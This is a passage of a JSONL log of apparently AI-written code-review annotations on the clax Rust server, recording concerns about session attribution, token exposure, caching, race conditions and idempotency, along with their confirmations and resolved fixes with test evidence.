(the concern on crates/clax-store/src/jobs.rs:1376-1388), and a re-plan then publishes twice. Test: hold an old-token publish step inside the content store, release the claim, claim again, and assert that the claim is answered only after the old step's commit.","kind":"comment","references":"091f185da31e38eab5b158528a869b12d7d4cba083d0fbe7bf104766d5af5793","summary":"Checking the claim inside the transaction narrows this window but does not close it; an admission guard that release waits on does","tags":["review","session:claude-code:e697d918-f48a-41f9-aac4-4be74128e8ae"]}}
{"metabox":"1","type":"annotation","subject":"crates/clax-server/src/routes/jobs.rs","issuer":"mailto:alex@kesling.co","issuer_type":"ai","created_at":"2026-10-20T09:19:56.893581Z","id":"4be751099bdbcf2888bad2a3dd4a5f2e57de048913a5c2d4ec5903f2189b9bcb","body":{"detail":"The publish routes, for a request with a session (crates/clax-server/src/routes/artifacts.rs create: ensure_watch and retarget_untargeted; publish_version near line 790: working_threads linked as the version's addresses, ensure_watch, ctx.working.clear with End::Publish, drafts::end, retarget_untargeted), and the create route's require_title. A publish step passes PublishStep.session_id only as the version's session: the session does not watch a new app, comments on it are not targeted to it, its working records and draft preview stay up after the version lands, and the threads it worked on are not linked unless the request names them in `addresses`. The app publishes today through POST /api/artifacts with x-clax-session (apps/clax_app/lib/clax/http_api.dart:953) and gets all of these; a queue moved onto steps would lose them. Spec §8.1 lists the reply step's working clear, not the publish step's.","kind":"concern","span":{"start":{"line":613},"end":{"line":663},"content_hash":"66b32f2da7a172da9326d97560cbe6ace89a098125e71f5abb1dbb3814df9934"},"suggested_fix":"After a non-replayed publish step with a session_id, run the publish route's session effects (factor them out of routes/artifacts.rs into one helper both call), and apply require_title to a new app's step; or record in spec §8.1 which of them a step leaves to the app.","summary":"A publish step from an agent session skips what the publish routes do for that session","tags":["review","session:claude-code:e697d918-f48a-41f9-aac4-4be74128e8ae"]}}
{"metabox":"1","type":"annotation","subject":"crates/clax-server/src/routes/jobs.rs","issuer":"mailto:alex@kesling.co","issuer_type":"ai","created_at":"2026-10-20T11:00:13.032597Z","id":"a046ab967a08d1952fbdb648cbc171130304c7552c283d49876afa07c597b396","body":{"kind":"resolve","ref":"git:20e1ed98c3fc","summary":"Fixed as reply 6d37915c proposed: JobsOwners::enter(client, token) counts in-flight writes under the claims mutex and answers a WriteGuard every job route holds across its store call; a release or replacement admits no new write at once, and claim (now async) answers only once the old claim's writes have ended, with no clock. Tests pass: bazelisk test //crates/clax-http:clax_http_lib_test (jobs_owner::tests::a_new_claim_answers_once_the_old_claims_writes_end, jobs_owner::tests::a_claim_replacing_a_detached_holder_waits_for_its_writes_and_admits_none_of_them; both fail with the drain removed) and //crates/clax-server:integration__1 (api_jobs::a_new_claim_answers_only_once_the_old_claims_write_has_landed, a publish step held in a gated content write).","supersedes":"091f185da31e38eab5b158528a869b12d7d4cba083d0fbe7bf104766d5af5793","tags":["reason:fixed","session:claude-code:e697d918-f48a-41f9-aac4-4be74128e8ae"]}}
{"metabox":"1","type":"annotation","subject":"crates/clax-server/src/routes/jobs.rs","issuer":"mailto:alex@kesling.co","issuer_type":"ai","created_at":"2026-10-20T11:00:14.743714Z","id":"aa5c20ba36f45343f3c83c26f874e92b84fb447f551eedeff4320f2a05bdaa4b","body":{"kind":"resolve","ref":"git:20e1ed98c3fc","summary":"Fixed: routes::artifacts::published_from (ensure_watch, working clear with End::Publish, drafts end, retarget_untargeted) is what the create and publish routes and the publish step call; the step checks its session as X-Clax-Session is checked, links working_threads to the version and requires a title for a new app. Test passes: bazelisk test //crates/clax-server:integration__* (api_jobs::a_publish_step_from_a_session_does_for_it_what_a_publish_does, each effect through the step); before the fix the version's addresses were empty.","supersedes":"4be751099bdbcf2888bad2a3dd4a5f2e57de048913a5c2d4ec5903f2189b9bcb","tags":["reason:fixed","session:claude-code:e697d918-f48a-41f9-aac4-4be74128e8ae"]}}
{"metabox":"1","type":"annotation","subject":"crates/clax-server/src/routes/artifacts.rs","issuer":"mailto:alex@kesling.co","issuer_type":"ai","created_at":"2026-10-19T15:59:40.356074Z","id":"ba839dc22b0b62d3285527c255ab1c700b718ada070854f9fb095ac63f274d66","body":{"detail":"fork takes Agent<ArtifactsFork>, which admits Caller::Person (fork_refusal handles it). For a browser caller Identity::caller (crates/clax-http/src/identity.rs:299-391) never reads or checks header_session; only grant and token callers have it validated. fork then calls session_header(&headers) (artifacts.rs:1094) and publishing_session(st, &session, grant=None) (artifacts.rs:1102), which accepts any live session whose grant_id is None, i.e. any of the owner's agent sessions. fork_artifact_async (crates/clax-store/src/forks.rs:83-200) stores it as the fork's owner_session_id and as version 1's session_id, and ensure_watch (artifacts.rs:1112) makes that owner agent watch the person's fork, so the person's later comments there are routed to the owner's agent as if it published the page. create and publish are not exposed this way because they take TokenOrAgent. Session IDs are stripped from browser views (strip_sessions), which narrows who can name one, but the handler should not depend on that.","kind":"concern","span":{"start":{"line":1094},"end":{"line":1113},"content_hash":"f6f7f1245f9076b6c4ff8c6a4ea2e55d5d68556f1c2970d60c223e0084298815"},"suggested_fix":"Take the session from the verified caller instead of the raw header: `let session = a.caller.session().map(str::to_string);` (None for Person/Owner-browser callers), or refuse X-Clax-Session with 400 when !a.caller.is_agent(). Add an api test where a Person cookie forks with X-Clax-Session naming an owner agent session and assert the fork has no owner_session_id and no watch.","summary":"fork reads X-Clax-Session raw for every caller, so a connected person's browser can attribute its fork to an owner's agent session and make that session watch it","tags":["review","review:deep-dive-2026-10-19","session:claude-code:39187025-0a9f-4b13-8d2e-a1ea08e924ac"]}}
{"metabox":"1","type":"annotation","subject":"crates/clax-server/src/routes/content.rs","issuer":"mailto:alex@kesling.co","issuer_type":"ai","created_at":"2026-10-19T15:59:40.356161Z","id":"3d1ff28002d90caa359de3b3e3b0ea58776c61e7b5544295658329e1eacc3349","body":{"detail":"lookup reads file_meta and, for a file that is not text/html, returns its bytes at once (content.rs:193-194); only the wrapped-page path checks st.get_artifact (content.rs:196). delete_artifact_async (crates/clax-store/src/artifacts.rs:368-458) only sets artifacts.deleted_at and leaves the versions rows, so file_meta still answers; it then removes the content repository and on failure only logs 'could not remove deleted artifact's files' (artifacts.rs:450-456). In that case, and in the window between the delete's commit and the repository removal (the read takes no content lock), GET /a/<aid>/<n>/<file> keeps serving a deleted artifact's images, scripts and data to anyone holding the URL, with Cache-Control immutable (content.rs:309-318), while its index answers 404.","kind":"concern","span":{"start":{"line":192},"end":{"line":194},"content_hash":"509498c32d87e6071cc25fcb676f5b01c64daab354fa07787d8b149ec5c7ab15"},"suggested_fix":"Check the artifact row before the raw branch: move `st.get_artifact(&id)?.ok_or(CoreError::NotFound)?;` above `if !always_wrap && !is_html(...)` in lookup (one indexed read), and add a test that deletes an artifact whose content removal fails (a content store stub) and asserts a supporting file answers 404.","summary":"A version's non-HTML files are served without checking that the artifact still exists","tags":["review","review:deep-dive-2026-10-19","session:claude-code:39187025-0a9f-4b13-8d2e-a1ea08e924ac"]}}
{"metabox":"1","type":"annotation","subject":"crates/clax-server/src/routes/artifacts.rs","issuer":"mailto:alex@kesling.co","issuer_type":"ai","created_at":"2026-10-19T15:59:40.356230Z","id":"4a99cab1ea600c2be9e97416061e6b8b1031475d4516ddc9a326e0aa84a3a49c","body":{"detail":"has_viewer is `who.owner_browser() || who.cookie.is_some()` (artifacts.rs:478), but the attention it guards is added whenever who.browser_viewer(st) names a viewer (artifacts.rs:514-516), and browser_viewer uses names_viewer(), which also counts hosted_viewer (crates/clax-http/src/identity.rs:260-263, 446-452). On a hosted daemon a signed-in person's or guest's request carries hosted_viewer with cookie None (identity.rs:162-169), so their per-viewer `attention` is answered without `Cache-Control: private, no-cache` and `Vary: Cookie` (artifacts.rs:526-534), unlike the owner's. A shared cache in front of the hosted daemon may then serve one viewer's attention to another.","kind":"concern","span":{"start":{"line":478},"end":{"line":534},"content_hash":"6e3490abebee564ff5ed042769e440dab84ba72ff0a67cb7c7d2761d4849d87e"},"suggested_fix":"Use `let has_viewer = who.owner_browser() || who.names_viewer();` so the header follows the same rule that decides whether attention is included, and cover a hosted viewer's GET in the hosted api tests.","summary":"GET /api/artifacts/<aid> marks a viewer's answer private only for a clax_viewer cookie, not for a hosted session's viewer","tags":["review","review:deep-dive-2026-10-19","session:claude-code:39187025-0a9f-4b13-8d2e-a1ea08e924ac"]}}
{"metabox":"1","type":"annotation","subject":"crates/clax-server/src/routes/feedback.rs","issuer":"mailto:alex@kesling.co","issuer_type":"ai","created_at":"2026-10-19T15:59:40.356285Z","id":"29aaf55978127ca5ca1d27b21b6bbeb87b8cbf6ab4f577d528a931fa4c6e5e96","body":{"detail":"AckBody's thread_ids and comment_ids (feedback.rs:735-740) have no length cap; ack passes them whole to Store::acknowledge and acknowledge_comments (feedback.rs:770-784), whose acknowledge_where (crates/clax-store/src/feedback.rs:1546-) runs a query per ID. Only the default JSON body limit bounds them, so one request with tens of thousands of IDs holds a store worker for the whole loop. Other ID-list routes cap theirs: inbox read takes at most MAX_MARK_IDS = 500 (inbox.rs:31, 514), threads:send MAX_BATCH_THREADS, viewers MAX_LOOKUP_IDS = 64 (viewers.rs:139), working MAX_WORKING_THREADS.","kind":"concern","span":{"start":{"line":733},"end":{"line":791},"content_hash":"4e93d7f54ce7c3cdd3e400650f6b4f212e16a08feefa818dd60dd343cb540497"},"suggested_fix":"Add a MAX_ACK_IDS (for example 500, as inbox's MAX_MARK_IDS) and answer 400 invalid_json when either list exceeds it, before store_call; document the cap in the handler's doc comment and docs/contract.md.","summary":"POST /api/sessions/<sid>/feedback/ack takes unbounded thread_ids and comment_ids lists and acknowledges them in one store call","tags":["review","review:deep-dive-2026-10-19","session:claude-code:39187025-0a9f-4b13-8d2e-a1ea08e924ac"]}}
{"metabox":"1","type":"annotation","subject":"crates/clax-server/src/routes/token.rs","issuer":"mailto:alex@kesling.co","issuer_type":"ai","created_at":"2026-10-19T15:59:40.356317Z","id":"c3cd21b02cb719005e6156b117397abed028fb77d468af8a38b37cbc1bee639a","body":{"detail":"token() checks only that the peer is a loopback address and Host is a literal local name (token.rs:33-41), then answers {\"token\": s.token}. docs/contract.md (Security model, around line 6082) says state-changing routes need the token 'from <CLAX_HOME>/daemon.json (mode 0600)', implying only the owner's OS user holds it, and says an owner agent 'runs as the owner's OS user' when it notes it can fetch the token. On a machine with several OS users (or a sandboxed process with loopback network but no file access), any of them can GET http://127.0.0.1:<port>/api/token and act as the owner, bypassing the file mode. The contract does not state that loopback is trusted as the owner.","kind":"concern","span":{"start":{"line":28},"end":{"line":47},"content_hash":"6afd754aefd043f6b9953b98d0d1876af97793f8b2ee5472c65d65b29c4e905d"},"suggested_fix":"Either state in docs/contract.md's Security model that every local user and process is trusted at the owner's level, or restrict /api/token to browser requests (require Sec-Fetch-Site: same-origin and an Origin of the daemon's own host, which a non-browser process can forge but which at least keeps it to the shell's flow) and, on platforms that allow it, check the peer's UID (SO_PEERCRED / LOCAL_PEERCRED on a Unix socket, or bind a per-user Unix socket for the token). Record the choice as a waiver if loopback trust is intended.","summary":"GET /api/token hands the daemon token to any process on the machine, including other OS users, which the 0600 daemon.json does not","tags":["review","review:deep-dive-2026-10-19","session:claude-code:39187025-0a9f-4b13-8d2e-a1ea08e924ac"]}}
{"metabox":"1","type":"annotation","subject":"crates/clax-server/src/routes/artifacts.rs","issuer":"mailto:alex@kesling.co","issuer_type":"ai","created_at":"2026-10-19T16:01:23.717144Z","id":"04784729156856a1533fd4b2c57a02a4f2fd381942241850fa071a1696cf08d4","body":{"detail":"crates/clax-http/src/identity.rs:362-370: a clax_viewer cookie yields Caller::Person without reading header_session (only the grant branch, 311-337, and the token branch, 341-348, check it). crates/clax-server/src/routes/artifacts.rs:1094 session_header(&headers) reads the raw header; 1095 a.grant() is None for Person (crates/clax-http/src/agent.rs:722-727); publishing_session (artifacts.rs:132-153) then accepts any live session whose grant_id is None, i.e. any owner agent session. fork_artifact_async receives it as session_id (artifacts.rs:1103-1110) and ensure_watch runs on it (1111-1113). fork_refusal (artifacts.rs:1018-1031) admits Caller::Person with create rights; person_agent_session (agent.rs:910-918) only rejects PersonAgent without a session. Concern severity fits: it needs a known owner session ID, which strip_sessions hides from browsers.","kind":"comment","references":"ba839dc22b0b62d3285527c255ab1c700b718ada070854f9fb095ac63f274d66","summary":"confirmed: fork takes X-Clax-Session raw for a Person caller and publishing_session accepts any live owner-agent session (grant None)","tags":["verified:confirmed","session:claude-code:39187025-0a9f-4b13-8d2e-a1ea08e924ac"]}}
{"metabox":"1","type":"annotation","subject":"crates/clax-server/src/routes/content.rs","issuer":"mailto:alex@kesling.co","issuer_type":"ai","created_at":"2026-10-19T16:01:23.717371Z","id":"73715aeefd32119f14eadbfceb3197e08b3d724b5d69fa0817658a26f3fab385","body":{"detail":"crates/clax-server/src/routes/content.rs:192-194 returns Served::Raw after st.file_meta only; st.get_artifact is first called at 196, on the HTML path. Store::file_meta (crates/clax-store/src/artifacts.rs:1524-1529) uses get_version (1488-1504), whose SELECT_VERSION (814-819) reads `versions` alone with no join to artifacts.deleted_at. delete_artifact_async (artifacts.rs:368ff) sets deleted_at and deletes many dependent tables but not versions, then on content-removal failure only logs \"could not remove deleted artifact's files\". The file route (content.rs:265-282) does no other existence check before lookup; the raw response carries http_cache::IMMUTABLE (content.rs:313-318).","kind":"comment","references":"3d1ff28002d90caa359de3b3e3b0ea58776c61e7b5544295658329e1eacc3349","summary":"confirmed: lookup returns a non-HTML file's bytes before any artifact-row check, and file_meta reads versions with no deleted_at filter","tags":["verified:confirmed","session:claude-code:39187025-0a9f-4b13-8d2e-a1ea08e924ac"]}}
{"metabox":"1","type":"annotation","subject":"crates/clax-server/src/routes/artifacts.rs","issuer":"mailto:alex@kesling.co","issuer_type":"ai","created_at":"2026-10-19T16:01:23.717538Z","id":"d161c308f8b4334b075cea0051bce9d74dd29f5ec75b0d614a94e880ce49a347","body":{"detail":"crates/clax-server/src/routes/artifacts.rs:478 `let has_viewer = who.owner_browser() || who.cookie.is_some();` vs 514-516 `if let Some(viewer) = who.browser_viewer(st)? { v[\"attention\"] = ... }`. browser_viewer (crates/clax-http/src/identity.rs:446-452) is true for owner_browser() || names_viewer(), and names_viewer (259-262) is cookie.is_some() || hosted_viewer.is_some(); owner_browser (425-428) covers hosted_owner but not hosted_viewer. The doc on hosted_viewer (identity.rs:166-170) says cookie is None there. So a hosted person's or guest's response with attention takes the else branch (artifacts.rs:535-536) with no Cache-Control/Vary. No global layer adds them: the only hosted Cache-Control inserts are no_store on sign-in responses (crates/clax-http/src/hosted.rs:1683-1687, crates/clax-server/src/hosted.rs:996-997).","kind":"comment","references":"4a99cab1ea600c2be9e97416061e6b8b1031475d4516ddc9a326e0aa84a3a49c","summary":"confirmed: has_viewer ignores hosted_viewer while browser_viewer, which gates attention, counts it","tags":["verified:confirmed","session:claude-code:39187025-0a9f-4b13-8d2e-a1ea08e924ac"]}}
{"metabox":"1","type":"annotation","subject":"crates/clax-server/src/routes/feedback.rs","issuer":"mailto:alex@kesling.co","issuer_type":"ai","created_at":"2026-10-19T16:01:23.717705Z","id":"040819efb1c8148092b33430caf05d9327fcf0dba5f1eb3d18dcb2188ca7e262","body":{"detail":"crates/clax-server/src/routes/feedback.rs:733-740 AckBody has Option<Vec<String>> with no cap; ack (749-791) checks only that one is present, then calls st.acknowledge and st.acknowledge_comments with the whole slices. crates/clax-store/src/feedback.rs:1573-1582 runs one prepared query per ID inside a single with_tx. Other ID-list routes cap: crates/clax-server/src/routes/inbox.rs:31 MAX_MARK_IDS = 500 (checked 514), viewers.rs:139 MAX_LOOKUP_IDS = 64 (checked 171), working.rs:47 MAX_WORKING_THREADS. The caller must hold the token or a grant (TokenOrAgent), so concern, not blocker, fits.","kind":"comment","references":"29aaf55978127ca5ca1d27b21b6bbeb87b8cbf6ab4f577d528a931fa4c6e5e96","summary":"confirmed: ack passes uncapped thread_ids/comment_ids into a per-ID query loop inside one transaction","tags":["verified:confirmed","session:claude-code:39187025-0a9f-4b13-8d2e-a1ea08e924ac"]}}
{"metabox":"1","type":"annotation","subject":"crates/clax-server/src/routes/token.rs","issuer":"mailto:alex@kesling.co","issuer_type":"ai","created_at":"2026-10-19T16:01:23.717866Z","id":"d0a82866b931982b5614cdad6aa815532f5cccb9a8f4f8b0e019f01a9c729dc4","body":{"detail":"crates/clax-server/src/routes/token.rs:33-47: the only checks are is_loopback(addr) and is_local_host(host); the body is {\"token\": s.token} for any such request, same-origin or not (the Sec-Fetch-Site check at 48-50 only adds cookies). docs/contract.md:6082-6083 ties state-changing routes to the token \"from <CLAX_HOME>/daemon.json (mode 0600)\"; 6107-6110 justifies an owner agent fetching /api/token because it \"runs as the owner's OS user\"; 6167-6173 describes the loopback rule but nowhere states that other OS users or processes on the machine are trusted at the owner's level. Concern severity fits: a documentation gap or accepted risk, not a defect a single-user install hits.","kind":"comment","references":"c3cd21b02cb719005e6156b117397abed028fb77d468af8a38b37cbc1bee639a","summary":"confirmed: GET /api/token gates only on a loopback peer and a local Host, so any local OS user or loopback-only sandbox gets the token","tags":["verified:confirmed","session:claude-code:39187025-0a9f-4b13-8d2e-a1ea08e924ac"]}}
{"metabox":"1","type":"annotation","subject":"crates/clax-server/src/routes/artifacts.rs","issuer":"mailto:alex@kesling.co","issuer_type":"ai","created_at":"2026-10-19T17:35:16.117221Z","id":"32f297a721a275a3f55c42abeca512e2f1c2ab3a3fcd68e553a612788b19a291","body":{"detail":"POST /api/artifacts is TokenOrAgent and takes any files: opening it to people's browsers would let a browser publish arbitrary HTML as a person, and the brief thread would be a second request the browser makes. POST /api/artifacts:new writes the placeholder itself (clax_core::brief::placeholder_html, the title escaped) and the brief thread in one store call, deleting the artifact when the thread cannot be written.","kind":"alternative","span":{"start":{"line":518},"end":{"line":635},"content_hash":"f49358eafb33e98a156891cbbed79487f972b03369b36a6b93961a0ee14081c0"},"summary":"Let the browser publish the placeholder through POST /api/artifacts instead of a route of its own","tags":["revisit:the gallery lets people paste or upload a page of their own","session:claude-code:d1f51555-8e8f-4c11-acd6-673f773ac34d"]}}
{"metabox":"1","type":"annotation","subject":"crates/clax-server/src/routes/threads.rs","issuer":"mailto:alex@kesling.co","issuer_type":"ai","created_at":"2026-10-19T17:35:16.117676Z","id":"d8ef18074e9eecdbcf14a25893036c458f753b79ca688be52ef1b993ca740c51","body":{"detail":"Watches are TokenOrAgent: a session subscribes itself. A browser adding a watch for any session would bypass the approval routing that a send naming an agent does (Store::send_routed, Route::Send). Instead a person's send {to} may name any live agent that may read and watch the artifact, giving it a watch exactly as an @name in their comment does (resolve_named): no new authority, and the approval path is the existing one. Agents keep the old rule (they hand threads off), and so do guests and LAN viewers and batch sends.","kind":"alternative","span":{"start":{"line":1196},"end":{"line":1235},"content_hash":"002de5d38485f823c7849ddb74c214758a74cbb70287d94b06f71ed865779fc6"},"summary":"Attach the picked agent with PUT /api/sessions/<sid>/watches/<aid> from the browser, or a route of its own","tags":["revisit:guests or LAN viewers need to attach agents from a Send menu","session:claude-code:d1f51555-8e8f-4c11-acd6-673f773ac34d"]}}
{"metabox":"1","type":"annotation","subject":"crates/clax-server/src/routes/artifacts.rs","issuer":"mailto:alex@kesling.co","issuer_type":"ai","created_at":"2026-10-19T17:35:16.118568Z","id":"d2a62dc61cd966d4ec578b1e49fb1de46007e87fc69c7f5f37cee72aca6ad8f2","body":{"detail":"The brief is written with announce_new_thread(mention=false, named=None): an @ in it sends nothing. The dialog's picker is the one way the brief reaches an agent, so a refused @name (agent_cannot_read) can never fail the artifact's creation after it was made.","kind":"alternative","span":{"start":{"line":518},"end":{"line":635},"content_hash":"f49358eafb33e98a156891cbbed79487f972b03369b36a6b93961a0ee14081c0"},"summary":"Act on @agent and @name in the brief as in any viewer comment","tags":["revisit:people write @name in briefs expecting it to send","session:claude-code:d1f51555-8e8f-4c11-acd6-673f773ac34d"]}}
{"metabox":"1","type":"annotation","subject":"crates/clax-server/src/routes/artifacts.rs","issuer":"mailto:alex@kesling.co","issuer_type":"ai","created_at":"2026-10-19T17:35:16.119187Z","id":"299d57e8452e92e12580ac75c3693b8882e9a60eefed6adca8020d82ab216ce1","body":{"detail":"Live seats are per artifact (docs/contract.md 'Live seats and spectators'); there is no gallery-wide spectator state. A new artifact is its maker's, so their seat there is reserved (clax_http::seats::claim_for: created_by), and they write and send its brief. brief_refusal checks the person's rights (create, read own, comments write) and refuses guests, but no seat. tests api_hosted::people_start_artifacts_from_briefs_and_guests_may_not shows Kim, a spectator on Plan, creating. If 'spectators may not create' means something else (for example refusing a person who is a spectator anywhere right now, or capping creation while seats are full), that needs a rule the seat model does not have yet.","kind":"concern","span":{"start":{"line":468},"end":{"line":510},"content_hash":"9bc6384c666632a0dd535666fef9943ec306bae9b30f09ed3511067d51fb0c4a"},"summary":"Spectators: a person beyond another artifact's live seats may start an artifact from a brief","tags":["status:needs-decision","session:claude-code:d1f51555-8e8f-4c11-acd6-673f773ac34d"]}}
{"metabox":"1","type":"annotation","subject":"crates/clax-server/src/routes/threads.rs","issuer":"mailto:alex@kesling.co","issuer_type":"ai","created_at":"2026-10-19T18:07:07.074908Z","id":"e52996401e38677af62dac46621520f5aca71947e9ac16603e107d8a458e7d6b","body":{"detail":"send_target calls st.ensure_watch (its own with_tx, crates/clax-store/src/watches.rs:346) and send() then calls send_routed in another transaction (threads.rs:1291). The resolved check at line 1282 reads the thread outside both, so a resolve committed between them leaves the agent watching with no send (send_in answers thread_resolved), contrary to the contract's 'each giving no watch' (docs/contract.md:1470-1471). Store::handoff, the other path through handoff_target, gives its watch inside the handoff's transaction 'once nothing refuses the handoff' (threads.rs handoff_target doc).","kind":"concern","span":{"start":{"line":1222},"end":{"line":1225},"content_hash":"2a60a186b027c97611656b5ada18f55998ef27e119e0b0aa544aaf7bdeba4890"},"suggested_fix":"Return the target from send_target without watching, and give the watch inside send_routed's transaction (as Store::handoff does), so a refused send writes nothing.","summary":"A person's send gives the named agent its watch in a transaction of its own, before and apart from the send","tags":["review","review:new-artifact","session:claude-code:d1f51555-8e8f-4c11-acd6-673f773ac34d"]}}
{"metabox":"1","type":"annotation","subject":"crates/clax-server/src/routes/artifacts.rs","issuer":"mailto:alex@kesling.co","issuer_type":"ai","created_at":"2026-10-19T18:07:07.075379Z","id":"b257d5e76e926f15f4f2f6c92b06841a7217bbe3a661ed8a0147f636ee594b51","body":{"detail":"create_from_brief writes a new artifact and thread on every call. The dialog guards a double press (busy, NewArtifactDialog.svelte:60) but start() (web/shell/src/view/new-artifact.ts) shows a network error after the daemon may already have committed, and the person presses Create again; two tabs do the same. POST /api/artifacts dedupes by publish key (artifacts.rs create: publish_key / replayed).","kind":"suggestion","span":{"start":{"line":518},"end":{"line":635},"content_hash":"f49358eafb33e98a156891cbbed79487f972b03369b36a6b93961a0ee14081c0"},"suggested_fix":"Accept an Idempotency-Key header (a ULID the dialog makes once per form) and answer the first artifact for a repeat, as publish_key does.","summary":"POST /api/artifacts:new takes no idempotency key: a retry after a lost response makes a second artifact","tags":["review","review:new-artifact","session:claude-code:d1f51555-8e8f-4c11-acd6-673f773ac34d"]}}
{"metabox":"1","type":"annotation","subject":"crates/clax-server/src/routes/threads.rs","issuer":"mailto:alex@kesling.co","issuer_type":"ai","created_at":"2026-10-19T18:10:48.568430Z","id":"8b6fdd3103c220c5139249c3a78928f1806ce52438ad57d929d1b81687a21441","body":{"detail":"threads.rs:1224 calls st.ensure_watch, which is its own self.with_tx (crates/clax-store/src/watches.rs:346-348); threads.rs:1291 send_routed opens further with_tx calls (crates/clax-store/src/feedback.rs:823). The resolved check reads the thread at threads.rs:1280-1282 outside both. Store calls run on a worker pool (crates/clax-store/src/exec.rs:875-893, 'never take every worker'), so a resolve from another request can commit between them. docs/contract.md:1470-1471 promises 'each giving no watch'. A narrow race, rightly a concern.","kind":"comment","references":"e52996401e38677af62dac46621520f5aca71947e9ac16603e107d8a458e7d6b","summary":"confirmed: the watch and the send commit in separate transactions, so a refused send can leave a watch","tags":["verified:confirmed","session:claude-code:d1f51555-8e8f-4c11-acd6-673f773ac34d"]}}
{"metabox":"1","type":"annotation","subject":"crates/clax-server/src/routes/artifacts.rs","issuer":"mailto:alex@kesling.co","issuer_type":"ai","created_at":"2026-10-19T18:10:48.580810Z","id":"f390c4f75f5e01a12c26a19dee021e26365acf8607dffcaf7ad53fc5617cdbad","body":{"detail":"crates/clax-server/src/routes/artifacts.rs:518-635 create_from_brief takes no HeaderMap and never calls publish_key or replayed (those appear only at :406-423 and :941-984). web/shell/src/view/new-artifact.ts:88-92 start() sends no key. Nuance: publish_key (artifacts.rs:169-173) honours the key only for an agent token grant, so POST /api/artifacts dedupes agent publishes only, not browser ones; a fix here would need its own keying for persons.","kind":"comment","references":"b257d5e76e926f15f4f2f6c92b06841a7217bbe3a661ed8a0147f636ee594b51","summary":"confirmed: POST /api/artifacts:new reads no Idempotency-Key, so a retry makes a second artifact","tags":["verified:confirmed","session:claude-code:d1f51555-8e8f-4c11-acd6-673f773ac34d"]}}
{"metabox":"1","type":"annotation","subject":"crates/clax-server/src/routes/threads.rs","issuer":"mailto:alex@kesling.co","issuer_type":"ai","created_at":"2026-10-19T18:48:23.099473Z","id":"eb059af485d142561606079db709fe36d2e5bd3ab9f83bf077e20b9acdf79331","body":{"kind":"resolve","ref":"git:a46ec7df2","summary":"Fixed: send_target returns the target and whether it needs a watch; Store::send_routed_watching (crates/clax-store/src/feedback.rs) gives the watch inside the send's transaction, so a refused send rolls it back. Evidence: //crates/clax-store:clax_store_lib_test and //crates/clax-server:integration__1..6 pass; api_briefs asserts no watch after each refusal.","supersedes":"e52996401e38677af62dac46621520f5aca71947e9ac16603e107d8a458e7d6b","tags":["reason:fixed","session:claude-code:d1f51555-8e8f-4c11-acd6-673f773ac34d"]}}
{"metabox":"1","type":"annotation","subject":"crates/clax-server/src/routes/artifacts.rs","issuer":"mailto:alex@kesling.co","issuer_type":"ai","created_at":"2026-10-19T18:48:23.380482Z","id":"9c9fe2a924d0d73417386792aad96678d9170b94a822c24ea0e45127b53713ab","body":{"kind":"resolve","ref":"git:a78e58f0e","summary":"Fixed: POST /api/artifacts:new takes Idempotency-Key, recorded per starter in briefs (migration 40, crates/clax-store/src/briefs.rs); a repeat answers 200 with the first artifact; the dialog makes one key per form and reuses it after a lost answer. Evidence: api_briefs::a_repeat_with_its_key_answers_the_first_artifact passes (same artifact and thread, another key or person makes another, a 129-character key is 400), and //web:unit passes 'retries Create with the same key after a lost answer, and a new one after a refusal'.","supersedes":"b257d5e76e926f15f4f2f6c92b06841a7217bbe3a661ed8a0147f636ee594b51","tags":["reason:fixed","session:claude-code:d1f51555-8e8f-4c11-acd6-673f773ac34d"]}}
{"metabox":"1","type":"annotation","subject":"crates/clax-server/src/routes/inbox.rs","issuer":"mailto:alex@kesling.co","issuer_type":"ai","created_at":"2026-10-19T17:23:32.344231Z","id":"73f3ffb9e9ece1e8ee60869ffa393b9de89f691cdf9facad9e8a03bf8ff0f1b4","body":{"detail":"The route sets a group's `artifact` to items.first()[\"artifact\"]. render() (crates/clax-http/src/views/inbox.rs:238) nulls the artifact for a person's item about a live page. The module doc says no such item is made for a person, so this does not happen today, but if it ever did, the client (web/shell/src/q/inbox-groups.ts fromWire) would key that group \"none\" beside the real Other group: duplicate keys in InboxPage.svelte's keyed each, shared open state, and Show more and Mark read sending artifact=none for the wrong items.","kind":"suggestion","span":{"start":{"line":367},"end":{"line":384},"content_hash":"a666b068e413ccc2c43ae33036804818cac0b4c0416e2604a0b5bd6301624e37"},"suggested_fix":"Drop a group whose first item's view has a null artifact while its artifact_id is set (or merge it into nothing), rather than emitting a second null-artifact group; a unit test on the route's group assembly would pin it.","summary":"A group's key on the wire comes from its first item's view, so a view that nulls its artifact makes it a second \"none\" group","tags":["review","review:inbox-by-artifact","inbox","hosted","session:claude-code:d1f51555-8e8f-4c11-acd6-673f773ac34d"]}}
{"metabox":"1","type":"annotation","subject":"crates/clax-server/src/routes/inbox.rs","issuer":"mailto:alex@kesling.co","issuer_type":"ai","created_at":"2026-10-19T17:26:04.630580Z","id":"feb49aacd897c43701ceb124f7e51a0fff31c467db9b4cfdaf5c6a896742df9f","body":{"detail":"crates/clax-server/src/routes/inbox.rs:370-373 sets artifact = items.first()[\"artifact\"] when g.artifact_id is Some. crates/clax-http/src/views/inbox.rs:238-250 returns a view without the artifact for a person's item about a live page; the module doc (lines 10-12) says no such item is made, so this is latent, as the finding (kind suggestion) says. web/shell/src/q/inbox-groups.ts fromWire keys a null artifact as NO_ARTIFACT (\"none\").","kind":"comment","references":"73f3ffb9e9ece1e8ee60869ffa393b9de89f691cdf9facad9e8a03bf8ff0f1b4","summary":"confirmed: the group's artifact comes from its first item's view, which a person's live-page view leaves out","tags":["verified:confirmed","session:claude-code:d1f51555-8e8f-4c11-acd6-673f773ac34d"]}}
{"metabox":"1","type":"annotation","subject":"crates/clax-server/src/routes/inbox.rs","issuer":"mailto:alex@kesling.co","issuer_type":"ai","created_at":"2026-10-19T18:21:41.180317Z","id":"ffb4d5a173b219910b0be18b0caa98538ad94c8fb56b7d6b872f7d9e86206991","body":{"kind":"resolve","ref":"git:ef4ada53c","summary":"Fixed: each group carries artifact_id, the store's grouping key, and the shell keys groups by it (inbox-groups.ts fromWire). Evidence: inbox-groups.test.ts keeps a page's key for a group whose first item names no artifact; api_inbox asserts artifact_id for a page's group and null for none; both pass.","supersedes":"73f3ffb9e9ece1e8ee60869ffa393b9de89f691cdf9facad9e8a03bf8ff0f1b4","tags":["reason:fixed","session:claude-code:d1f51555-8e8f-4c11-acd6-673f773ac34d"]}}
